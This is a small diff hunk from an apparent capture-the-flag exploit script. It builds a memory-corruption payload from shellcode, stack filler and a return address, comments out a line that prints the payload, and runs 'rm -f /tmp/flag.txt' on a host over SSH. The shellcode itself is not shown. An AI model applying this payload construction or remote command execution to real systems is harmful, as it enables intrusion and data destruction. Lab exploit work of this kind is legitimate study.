@@ -65,7 +65,7 @@ main() {
     # 5. Setup the payload.
     payload="${octal_shellcode}${local_vars_filler}${ebp_filler}${heap_ptr_return_addr}";
 
-    printf "Payload: %s\n" "$payload";
+    # printf "Payload: %s\n" "$payload";
 
     ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; }
     ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
